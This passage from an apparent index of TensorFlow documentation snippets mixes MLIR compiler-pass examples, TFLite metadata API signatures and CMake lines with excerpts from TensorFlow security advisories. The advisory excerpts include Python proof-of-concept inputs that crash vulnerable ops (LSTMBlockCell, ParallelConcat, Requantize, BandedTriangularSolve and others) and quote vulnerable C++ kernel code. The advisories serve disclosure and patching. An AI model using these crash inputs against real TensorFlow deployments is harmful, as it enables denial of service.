   }

   // Combine array of sliced tensors into a list of tensors
   %output = tosa.IDENTITYN(%output_arr)
   return %output
}
```

----------------------------------------

TITLE: Demonstrating LSTMBlockCell Input Validation Vulnerability (Python)
DESCRIPTION: This Python code snippet demonstrates the TFSA-2022-069 vulnerability in `tf.raw_ops.LSTMBlockCell`. It constructs and calls the operation with input tensors having incorrect shapes/ranks (e.g., `wci`, `wcf`, `wco`). When executed on vulnerable TensorFlow versions, this will trigger a CHECK-failure and cause a denial-of-service. It requires the TensorFlow library to be installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-069.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

tf.raw_ops.LSTMBlockCell(
  x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),
  cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),
  h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),
  w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),
  wci=tf.constant(0, shape=[], dtype=tf.float32),
  wcf=tf.constant(0, shape=[17], dtype=tf.float32),
  wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),
  b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),
  forget_bias=1, cell_clip=0, use_peephole=False)
```

----------------------------------------

TITLE: Get BoundingBoxProperties Index Vector Length Python
DESCRIPTION: Returns the number of elements in the 'index' vector within the bounding box properties. This indicates the size of the index list.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxProperties.md#_snippet_7

LANGUAGE: Python
CODE:
```
IndexLength()
```

----------------------------------------

TITLE: Creating Bounding Box Start Index Vector (Python)
DESCRIPTION: This Python function is part of the FlatBuffers generation for TensorFlow Lite metadata. It is used to start a vector (array) of indices within a FlatBuffer builder, specifically designed for bounding box properties. It takes the FlatBuffer `builder` instance and the expected number of elements (`numElems`) in the vector as arguments.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxPropertiesStartIndexVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.BoundingBoxPropertiesStartIndexVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Demonstrating TensorFlow create_file_writer Vulnerability (Python)
DESCRIPTION: This Python code snippet demonstrates how to trigger the vulnerability in `tf.summary.create_file_writer`. By providing a non-scalar NumPy array to the `flush_millis` argument, the function's incomplete validation leads to a crash (a `CHECK`-fail).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-197.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np
tf.summary.create_file_writer(logdir='', flush_millis=np.ones((1,2)))
```

----------------------------------------

TITLE: Applying Clamp Transformation to Start Indices (C++)
DESCRIPTION: This snippet shows the C++ expression used internally to clamp each dimension's start index for the `DynamicUpdateSlice` operation. It ensures the effective starting index is always within the valid range, preventing out-of-bounds updates. The range is [0, operand_size - update_size].
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/operation_semantics.md#_snippet_19

LANGUAGE: C++
CODE:
```
start_indices[i] = clamp(start_indices[i], 0, operand.dimension_size[i] - update.dimension_size[i])
```

----------------------------------------

TITLE: Reproducing ParallelConcat Vulnerability with XLA - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the null dereference vulnerability in tf.raw_ops.ParallelConcat. It requires TensorFlow and uses a shape parameter of 0, which, when compiled with XLA (jit_compile=True), causes a segfault in vulnerable versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2023-005.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

func = tf.raw_ops.ParallelConcat
para = {'shape':  0, 'values': [1]}

@tf.function(jit_compile=True)
def test():
   y = func(**para)
   return y

test()
```

----------------------------------------

TITLE: Calculating Tensor Byte Size in TensorFlow C++
DESCRIPTION: This C++ function calculates the total byte size of a `TensorProto` object. It determines the number of elements using `TensorShape` and multiplies by the data type size. The surrounding text notes that using `TensorShape` here is vulnerable because it can trigger `CHECK` failures on invalid or partial shapes, unlike `PartialTensorShape`, which would correctly return -1.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-045.md#_snippet_0

LANGUAGE: C++
CODE:
```
int64_t TensorByteSize(const TensorProto& t) {
  // num_elements returns -1 if shape is not fully defined.
  int64_t num_elems = TensorShape(t.tensor_shape()).num_elements();
  return num_elems < 0 ? -1 : num_elems * DataTypeSize(t.dtype());
}
```

----------------------------------------

TITLE: Accessing Image Default Size (Python)
DESCRIPTION: Retrieves the default size property of the image metadata. This method is likely an instance method called on an `ImageProperties` object and requires no parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageProperties.md#_snippet_1

LANGUAGE: python
CODE:
```
DefaultSize()
```

----------------------------------------

TITLE: Calculating Batch Size in TFLite Fully Connected Kernel (C++)
DESCRIPTION: This C++ snippet calculates the batch size for a fully connected layer in TFLite's kernel implementation. The division operation here is the source of the TFSA-2021-154 vulnerability if the filter dimension `filter->dims->data[1]` is zero. It requires `input_size` and access to the filter tensor's dimension data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-154.md#_snippet_0

LANGUAGE: C++
CODE:
```
const int batch_size = input_size / filter->dims->data[1];
```

----------------------------------------

TITLE: Decomposition of TF Stack Push Operation (MLIR)
DESCRIPTION: Illustrates the sequence of MLIR operations used to replace a `tf.StackPush` operation during the stack decomposition pass. It involves reading buffer and size variables, calculating update offsets, performing a dynamic update on the buffer tensor, and incrementing the size variable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_42

LANGUAGE: MLIR
CODE:
```
  %old_val = "tf.ReadVariableOp"(%buffer)
  %old_size = "tf.ReadVariableOp"(%size)
  %offsets = "tf.ConcatV2"(%old_size, %other_dims_0s, %const0)
  %new_val = "tf.XlaDynamicUpdateSlice"(%old_val, %push_val, %offsets)
  "tf.AssignVariableOp"(%buffer, %new_val)
  %new_size = "tf.AddV2"(%old_size, %const1)
  "tf.AssignVariableOp"(%size, %new_size)
```

----------------------------------------

TITLE: Prepare FlatBuffers Vector for Tensor Associated Files (Python)
DESCRIPTION: This Python function is part of the FlatBuffers building process for TFLite metadata. It is called to prepare space for a vector of associated file indices within a TensorMetadata object, typically used after adding vector elements and before finishing the FlatBuffer table.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorMetadataStartAssociatedFilesVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorMetadataStartAssociatedFilesVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Propagating Resource Device Attributes in MLIR
DESCRIPTION: This example showcases the `-tf-resource-device-inference` pass, demonstrating how a device attribute (`tf.device = "/TPU:0"`) assigned to a function argument (`%arg0`) is automatically propagated to an operation (`tf.Identity`) within a `tf_executor.island` that uses this resource argument. This helps ensure operations are placed on the correct devices based on resource assignments. It requires resources with `tf.device` attributes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_39

LANGUAGE: MLIR
CODE:
```
  !tf_res = type tensor<*x!tf_type.resource<tensor<32xf32>>>

  func @test(%arg0: !tf_res {tf.device = "/TPU:0"}) {
    tf_executor.graph {
      %control = tf_executor.island {
        %id0 = "tf.Identity"(%arg0) : (!tf_res) -> !tf_res
        tf_executor.yield
      }
      tf_executor.fetch %control : !tf_executor.control
    }
    return
  }
```

LANGUAGE: MLIR
CODE:
```
  !tf_res = type tensor<*x!tf_type.resource<tensor<32xf32>>>

  func @test(%arg0: !tf_res {tf.device = "/TPU:0"}) {
    tf_executor.graph {
      %control = tf_executor.island {
        %0 = "tf.Identity"(%arg0) {device = "/TPU:0"} : (!tf_res) -> !tf_res
        tf_executor.yield
      }
      tf_executor.fetch %control : !tf_executor.control
    }
    return
  }
```

----------------------------------------

TITLE: Constructing Printf Format String - C++
DESCRIPTION: This C++ snippet shows the vulnerable code path within the `as_string_op.cc` file where the internal format string for `printf` is constructed. The user-controlled `fill_string` (derived from the `fill` argument) is directly appended to the format string, which is the root cause of the format-string vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-013.md#_snippet_0

LANGUAGE: C++
CODE:
```
    format_ = "%";
    if (width > -1) {
      strings::Appendf(&format_, "%s%d", fill_string.c_str(), width);
    }
    if (precision > -1) {
      strings::Appendf(&format_, ".%d", precision);
    }
```

----------------------------------------

TITLE: Build Common MLIR HLO CAPI Library
DESCRIPTION: This command builds a shared library (`MLIRHLOCAPI`) containing the common CAPI components required for the Python bindings. It specifies the installation destination, output directory, and includes all declared MLIR Python source groups.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/bindings/python/CMakeLists.txt#_snippet_6

LANGUAGE: CMake
CODE:
```
add_mlir_python_common_capi_library(MLIRHLOCAPI
  INSTALL_COMPONENT MLIRHLOPythonModules
  INSTALL_DESTINATION python_packages/mlir_hlo/mlir/_mlir_libs
  OUTPUT_DIRECTORY "${MLIR_HLO_BINARY_DIR}/python_packages/mlir_hlo/mlir/_mlir_libs"
  RELATIVE_INSTALL_ROOT "../../../../"
  DECLARED_SOURCES
    MLIRPythonSources
    MLIRPythonExtension.RegisterEverything
    MLIRHLOPythonSources
    MLIRHLOPythonExtensions
)
```

----------------------------------------

TITLE: Reproducing Requantize Segfault TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how to reproduce the TFSA-2022-104 segfault vulnerability in vulnerable TensorFlow versions. It calls `tf.raw_ops.Requantize` with specifically crafted tensor shapes and values for the min/max inputs which triggers the crash. Requires a vulnerable TensorFlow version (prior to 2.10.0 or unpatched 2.9/2.8/2.7 releases).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-104.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

out_type = tf.quint8
input = tf.constant([1], shape=[3], dtype=tf.qint32)
input_min = tf.constant([], shape=[0], dtype=tf.float32)
input_max = tf.constant(-256, shape=[1], dtype=tf.float32)
requested_output_min = tf.constant(-256, shape=[1], dtype=tf.float32)
requested_output_max = tf.constant(-256, shape=[1], dtype=tf.float32)
tf.raw_ops.Requantize(input=input, input_min=input_min, input_max=input_max, requested_output_min=requested_output_min, requested_output_max=requested_output_max, out_type=out_type)
```

----------------------------------------

TITLE: Processing TFLite Tensor Dimensions in Concatenation Kernel C++
DESCRIPTION: This C++ snippet from the TFLite concatenation kernel shows how input tensor dimensions are processed. It iterates through dimensions, summing the dimension along the concatenation 'axis' and ensuring other dimensions match the first input's dimensions. The vulnerability arises here because `sum_axis` and `t->dims->data[axis]` are `int`, which can overflow if the sum of dimensions becomes too large.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-091.md#_snippet_0

LANGUAGE: C++
CODE:
```
for (int d = 0; d < t0->dims->size; ++d) {
  if (d == axis) {
    sum_axis += t->dims->data[axis];
  } else {
    TF_LITE_ENSURE_EQ(context, t->dims->data[d], t0->dims->data[d]);
  }
}
```

----------------------------------------

TITLE: Adding Bounding Box Type in TFLite Support (Python)
DESCRIPTION: This snippet shows the function signature for `BoundingBoxPropertiesAddType`. It is used to add the `type` field to a FlatBuffers builder for `BoundingBoxProperties` within the TFLite metadata schema. It requires a FlatBuffers `builder` object and the `type` value to be added.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxPropertiesAddType.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.BoundingBoxPropertiesAddType(
    builder, type
)
```

----------------------------------------

TITLE: Get Padding Values from Pad Type - Pseudo-code (C++)
DESCRIPTION: Calculates explicit padding values for spatial dimensions based on a standard TensorFlow padding type (like SAME or VALID), input/filter types, strides, and dilations. It asserts that the padding type is not EXPLICIT and uses an internal helper to determine the required padding to achieve the desired output size.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_1

LANGUAGE: Pseudo-code (C++)
CODE:
```
vector<int64> get_padding_values_from_pad_type(tensorflow::Padding padding, tensorflow::TensorFormat data_format,
                                        uint32 first_filter_spatial_dim, type input_type, type filter_type,
                                        vector strides, vector dilations)
{
    assert(padding != tensorflow::Padding::EXPLICIT);

    vector<int64> computed_padding;

    // Padding over H and W dimensions
    for (int32 i = 0; i < 2; i++) {
        int32 ifm_dim = get_tensor_spatial_dim_index(4, data_format, i);

        int32 filter_dim = first_filter_spatial_dim + i;

        int32 dim_dilation = dilations[ifm_dim];
        int32 dim_stride   = strides[ifm_dim];

        int64 op_size, pad_before_tf, pad_after_tf;

        tensorflow::GetWindowedOutputSizeVerbose(input_type.shape[ifm_dim], filter_type.shape[filter_dim],
                                                   dim_dilation, dim_stride, padding,
                                                   // Outputs
                                                   &op_size, &pad_before_tf, &pad_after_tf);
        computed_paddings.push_back(pad_before_tf);
        computed_paddings.push_back(pad_after_tf);
    }

    return computed_paddings;
}
```

----------------------------------------

TITLE: Executing Traced Save Function - TensorFlow GraphDef
DESCRIPTION: This node represents a call to a stateful, partitioned function (`__inference__traced_save_45`), likely implementing the save logic. It takes the saver filename placeholder, the variable handle, and the constant string node as inputs, suggesting it orchestrates the saving process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tf2xla/api/v2/testdata/graph_with_flib_def.txt#_snippet_5

LANGUAGE: TensorFlow GraphDef
CODE:
```
node {
  name: "StatefulPartitionedCall"
  op: "StatefulPartitionedCall"
  input: "saver_filename"
  input: "Variable"
  input: "Const"
  attr {
    key: "Tin"
    value {
      list {
        type: DT_STRING
        type: DT_RESOURCE
        type: DT_STRING
      }
    }
  }
  attr {
    key: "Tout"
    value {
      list {
        type: DT_STRING
      }
    }
  }
  attr {
    key: "_collective_manager_ids"
    value {
      list {
      }
    }
  }
  attr {
    key: "_output_shapes"
    value {
      list {
        shape {
        }
      }
    }
  }
  attr {
    key: "_read_only_resource_inputs"
    value {
      list {
      }
    }
  }
  attr {
    key: "config_proto"
    value {
      s: "\n\007\n\003CPU\020\001\n\007\n\003GPU\020\0002\002J\0008\001\202\001\000\222\001\002J\000"
    }
  }
  attr {
    key: "f"
    value {
      func {
        name: "__inference__traced_save_45"
      }
    }
  }
}
```

----------------------------------------

TITLE: MLIR After Sharding Identification
DESCRIPTION: This MLIR snippet shows the result of applying the `-tf-tpu-sharding-identification` pass. Sharding configurations (`input_sharding_configuration`, `output_sharding_configuration`) are now added as attributes to the `tf_device.cluster_func`, and `mhlo.sharding` attributes are added to the function's arguments and results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_70

LANGUAGE: mlir
CODE:
```
  func @test(%arg0: tensor<*xi32>) {
    %0 = "tf_device.cluster_func"(%arg0) {
        func = @func,
        input_sharding_configuration = ["\01\02\03"],
        output_sharding_configuration = ["\08\01\1A\01\01\22\01\00"],
        step_marker_location = ""} : (tensor<*xi32>) -> tensor<*xi32>
    return
  }
  func @func(%arg0: tensor<*xi32> {mhlo.sharding = "\01\02\03"}) ->
            (tensor<*xi32> {mhlo.sharding = "\08\01\1A\01\01\22\01\00"}) {
    %0 = "tf.XlaSharding"(%arg0) {_XlaSharding = "\01\02\03", sharding = "\01\02\03"} : (tensor<*xi32>) -> tensor<*xi32>
    %1 = "tf.A"(%0) : (tensor<*xi32>) -> tensor<*xi32>
    return %1 : tensor<*xi32>
  }
```

----------------------------------------

TITLE: Initializing AssociatedFileT From Packed Buffer Python
DESCRIPTION: A class method to initialize an `AssociatedFileT` object by deserializing from a packed byte buffer, starting at an optional position. This is likely used for reading packed FlatBuffers data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFileT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Implementing TargetHardware Interface (C++)
DESCRIPTION: Illustrates the interface for defining an advanced custom hardware backend by inheriting from `TargetHardware`. It includes methods for checking operator support, calculating costs for switching between hardware, estimating individual operation costs, and defining hardware-specific MLIR transformation patterns. Required base class: `TargetHardware`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/lite/experimental/tac/README.md#_snippet_3

LANGUAGE: C++
CODE:
```
class MyCustomHardware : public TargetHardware {
 public:
  static constexpr char kId[] = "MY_CUSTOM_HARDWARE";

  mlir::TypeID GetTypeId() const override {
    return mlir::TypeID::get<MyCustomHardware>();
  }
  
  bool IsOpSupported(mlir::Operation* op) const override {
    // check whether the op is supported, if the user has they own dialect,
    // this can be target dialect legalization process.
  }
  
 double GetHardwareSwitchingCost(const TargetHardware* from,
                                 size_t buffer_size) const override {
    // Get the hardware switching cost from the source hardware.
 }

  double GetOpCost(mlir::Operation* op) const override {
    // call customized cost model.
  }
  
  mlir::RewritePatternSet GetTransformations(
      MLIRContext* context) const override {
    // customized transformations patterns: ops lowering/fusion, layout
    // transformation, etc.
  }
};
```

----------------------------------------

TITLE: Calculating Output Size in TFLite SpaceToBatchNd C++
DESCRIPTION: This C++ snippet from the TensorFlow Lite implementation of the `SpaceToBatchNd` operator shows the calculation of the output dimension size. It first asserts that the final dimension size is divisible by the block shape dimension and then performs the division. A division by zero vulnerability exists here if `block_shape[dim]` is zero.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-085.md#_snippet_0

LANGUAGE: C++
CODE:
```
TF_LITE_ENSURE_EQ(context, final_dim_size % block_shape[dim], 0);
output_size->data[dim + 1] = final_dim_size / block_shape[dim];
```

----------------------------------------

TITLE: Demonstrating TensorFlow TensorListScatter Vulnerability - Python
DESCRIPTION: This Python code snippet demonstrates the denial of service vulnerability in TensorFlow's `tf.raw_ops.TensorListScatter`. It creates input tensors, including an `element_shape` with a rank greater than one (shape=(2, 2, 2)), which triggers a `CHECK` fail when passed to the operation, leading to a crash or service denial.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-129.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)
arg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_3=''
tf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, 
element_shape=arg_2, name=arg_3)
```

----------------------------------------

TITLE: Demonstrating SparseSparseMinimum Vulnerability - Python
DESCRIPTION: This Python code snippet demonstrates how to trigger the incomplete validation vulnerability (CVE-2021-29607) in TensorFlow's `tf.raw_ops.SparseSparseMinimum`. It constructs two sparse tensors (`a` and `b`) with deliberately inconsistent index dimensions and shape sizes (e.g., a_indices shape [45, 92] vs a_shape [1]), bypassing validation checks in vulnerable TensorFlow versions and leading to undefined behavior when the operation is called.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-097.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

a_indices = tf.ones([45, 92], dtype=tf.int64)
a_values = tf.ones([45], dtype=tf.int64)
a_shape = tf.ones([1], dtype=tf.int64)
b_indices = tf.ones([1, 1], dtype=tf.int64)
b_values = tf.ones([1], dtype=tf.int64)
b_shape = tf.ones([1], dtype=tf.int64)

tf.raw_ops.SparseSparseMinimum(a_indices=a_indices,
    a_values=a_values,
    a_shape=a_shape,
    b_indices=b_indices,
    b_values=b_values,
    b_shape=b_shape)
```

----------------------------------------

TITLE: Triggering Heap Overflow in BandedTriangularSolve (Python)
DESCRIPTION: This Python snippet demonstrates how the vulnerability in `tf.raw_ops.BandedTriangularSolve` can be triggered. It creates an empty NumPy array, converts it to an empty TensorFlow tensor, and passes it as the `matrix` input to the operation, leading to a heap buffer overflow due to lack of empty tensor validation. Requires `tensorflow` and `numpy`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-100.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

matrix_array = np.array([])
matrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(0,1)),dtype=tf.float32)
rhs_array = np.array([1,1])
rhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(1,2)),dtype=tf.float32)
tf.raw_ops.BandedTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor)
```

----------------------------------------

TITLE: Triggering Incomplete Validation in MKL RequantizePerChannel (Python)
DESCRIPTION: This Python snippet demonstrates calling the `gen_math_ops.requantize_per_channel` operation with invalid input arguments, such as empty lists or dimension mismatches. This highlights a vulnerability in the MKL implementation where input validation is incomplete, potentially leading to undefined behavior or out-of-bounds memory access. It requires the TensorFlow library and specific math operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-139.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
from tensorflow.python.ops import gen_math_ops

gen_math_ops.requantize_per_channel(
  input=[],
  input_min=[-100,-100,-100,-100,-100],
  input_max=[-100,-100,-100],
  requested_output_min=[-100,-100,-100,-100,-100],
  requested_output_max=[],
  out_type=tf.int)
```

----------------------------------------

TITLE: Accessing Empty Tensor Dimensions in SparseTensorSliceDataset Op (C++)
DESCRIPTION: This C++ snippet shows the validation loop within the `SparseTensorSliceDataset` operation kernel. When the `indices` tensor is empty, accessing `indices->dim_size(0)` within this loop results in a null pointer dereference, leading to the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-121.md#_snippet_1

LANGUAGE: cc
CODE:
```
    for (int64_t i = 0; i < indices->dim_size(0); ++i) {
      int64_t next_batch_index = indices->matrix<int64>()(i, 0);
      ...
    }
```

----------------------------------------

TITLE: Output Example: Island Replaced by PartitionedCall (TPU V1 Outlining)
DESCRIPTION: This MLIR snippet shows the result after applying the `-tf-executor-tpu-v1-island-outlining` pass. The original island's content is extracted into a new function within a nested module, and the island itself is replaced with a `tf_executor.island wraps "tf.PartitionedCall"` referencing the new outlined function.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_22

LANGUAGE: MLIR
CODE:
```
  func nested @_tpu_v1_compat_outlined_func0() -> tensor<i32> {
    ...
  }
```

LANGUAGE: MLIR
CODE:
```
  func @test() -> tensor<i32> {
    %0 = tf_executor.graph {
      %outputs, %control = tf_executor.island wraps "tf.PartitionedCall"() {
          f = @_tpu_v1_compat_outlined::@_tpu_v1_compat_outlined_func0
      } : () -> tensor<i32>
      tf_executor.fetch %outputs : tensor<i32>
    }
    return %0 : tensor<i32>
  }
```

----------------------------------------

TITLE: MLIR TPU Resource Partitioning Pass: After
DESCRIPTION: This MLIR snippet shows the IR after the `-tf-tpu-resource-partition` pass. Resource accesses are partitioned, with `tf.ReadVariableOp` and `tf.AssignVariableOp` now targeting individual resource handles (`%arg0`, `%arg1`), enabling passes to operate on per-core/device handles.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_60

LANGUAGE: MLIR
CODE:
```
func @cluster(%arg0: tensor<!tf_type.resource<tensor<i32>>>, %arg1: tensor<!tf_type.resource<tensor<i32>>>) {
  %read0 = "tf.ReadVariableOp"(%arg0) : (tensor<!tf_type.resource<tensor<i32>>>) -> tensor<i32>
  %read1 = "tf.ReadVariableOp"(%arg1) : (tensor<!tf_type.resource<tensor<i32>>>) -> tensor<i32>
  %partitioned_input = "tf.TPUPartitionedInput"(%read0, %read1) {N = 2 : i64, _XlaSharding = "", partition_dim = -1 : i64} : (tensor<i32>, tensor<i32>) -> tensor<i32>
  %computation = "tf_device.cluster_func"(%partitioned_input) {func = @computation, use_spmd_for_xla_partitioning = true} : (tensor<i32>) -> tensor<i32>
  %partitioned_output:2 = "tf.TPUPartitionedOutput"(%computation) {N = 2 : i64, _XlaSharding = "", partition_dim = -1 : i64} : (tensor<i32>) -> (tensor<i32>, tensor<i32>)
  "tf.AssignVariableOp"(%arg0, %partitioned_output#0) : (tensor<!tf_type.resource<tensor<i32>>>, tensor<i32>) -> ()
  "tf.AssignVariableOp"(%arg1, %partitioned_output#1) : (tensor<!tf_type.resource<tensor<i32>>>, tensor<i32>) -> ()
  return
}

func @computation(%arg0: tensor<i32>) -> tensor<i32> {
  return %arg0: tensor<i32>
}
```

----------------------------------------

TITLE: Generating Transpose GPU Kernel MLIR/XLA-GPU
DESCRIPTION: This snippet shows MLIR code representing a GPU kernel for a transpose operation. It uses `xla_gpu.allocate_shared` for temporary storage and `xla_gpu.loop` with `xla_gpu.sync_threads` to coordinate threads for coalesced reads and writes via shared memory. The function takes two f32 tensors and returns a transposed one.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/emitters.md#_snippet_7

LANGUAGE: MLIR/XLA-GPU
CODE:
```
func.func @transpose(%arg0: tensor<20x160x170xf32>, %arg1: tensor<170x160x20xf32>) -> tensor<170x160x20xf32> {
  %thread_id_x = gpu.thread_id  x {xla.range = [0 : index, 127 : index]}
  %block_id_x = gpu.block_id  x {xla.range = [0 : index, 959 : index]}

  %shmem = xla_gpu.allocate_shared : tensor<32x1x33xf32>
  %xla_loop = xla_gpu.loop (%thread_id_x, %block_id_x)[%i, %j]
      -> (%input_dim0, %input_dim1, %input_dim2, %shmem_dim0, %shmem_dim1, %shmem_dim2)
      in #map iter_args(%iter = %shmem) -> (tensor<32x1x33xf32>) {
    %extracted = tensor.extract %arg0[%input_dim0, %input_dim1, %input_dim2] : tensor<20x160x170xf32>
    %0 = math.exp %extracted : f32
    %inserted = tensor.insert %0 into %iter[%shmem_dim0, %shmem_dim1, %shmem_dim2] : tensor<32x1x33xf32>
    xla_gpu.yield %inserted : tensor<32x1x33xf32>
  }

  %synced_tensor = xla_gpu.sync_threads %xla_loop : tensor<32x1x33xf32>

  %xla_loop_0 = xla_gpu.loop (%thread_id_x %block_id_x)[%i, %j] -> (%dim0, %dim1, %dim2)
      in #map1 iter_args(%iter = %arg1) -> (tensor<170x160x20xf32>) {
    // indexing computations
    %extracted = tensor.extract %synced_tensor[%0, %c0, %1] : tensor<32x1x33xf32>
    %2 = math.absf %extracted : f32
    %inserted = tensor.insert %2 into %iter[%3, %4, %1] : tensor<170x160x20xf32>
    xla_gpu.yield %inserted : tensor<170x160x20xf32>
  }
  return %xla_loop_0 : tensor<170x160x20xf32>
}
```

----------------------------------------

TITLE: Adding CMake INTERFACE Library Target
DESCRIPTION: This command adds an INTERFACE library target named `ml_dtypes`. INTERFACE libraries do not compile source files themselves but propagate usage requirements (like include directories, compile definitions, etc.) to targets that link to them.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/ml_dtypes/CMakeLists.txt#_snippet_3

LANGUAGE: CMake
CODE:
```
add_library(ml_dtypes INTERFACE)
```

----------------------------------------

TITLE: Adding Include Directories to Target
DESCRIPTION: This command specifies the include directories required by the `ml_dtypes` target. It adds the main source directory and its `ml_dtypes` subdirectory as INTERFACE include directories, meaning any target linking to `ml_dtypes` will automatically inherit these include paths.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/ml_dtypes/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
target_include_directories(ml_dtypes INTERFACE
  "${ML_DTYPES_SOURCE_DIR}"
  "${ML_DTYPES_SOURCE_DIR}/ml_dtypes")
```

----------------------------------------

TITLE: Creating Library Alias CMake
DESCRIPTION: Creates an alias target named `fft2d` that refers to the `fft2d_fftsg2d` library target. This provides a simpler, canonical name for the primary 2D FFT library target.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/fft2d/CMakeLists.txt#_snippet_9

LANGUAGE: CMake
CODE:
```
add_library(fft2d ALIAS fft2d_fftsg2d)
```

----------------------------------------

TITLE: Vulnerable Modulo Operation in Conv3D Kernel - TensorFlow C++
DESCRIPTION: This C++ code snippet from the TensorFlow kernel (`conv_ops_3d.cc`) shows the specific check `in_depth % filter_depth == 0`. When `filter_depth` is zero due to crafted input tensor dimensions, this operation triggers a division-by-zero error, exploited by the Python vulnerability demonstration. This is internal kernel code.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-006.md#_snippet_1

LANGUAGE: C++
CODE:
```
  const int64 out_depth = filter.dim_size(4);
  OP_REQUIRES(context, in_depth % filter_depth == 0, ...);
```

----------------------------------------

TITLE: Lowering tfl.pseudo_const to TOSA MLIR
DESCRIPTION: Documents the trivial lowering of the TensorFlow Lite `tfl.pseudo_const` operation, likely representing a constant value, directly to the TOSA dialect's `tosa.CONST` operation.
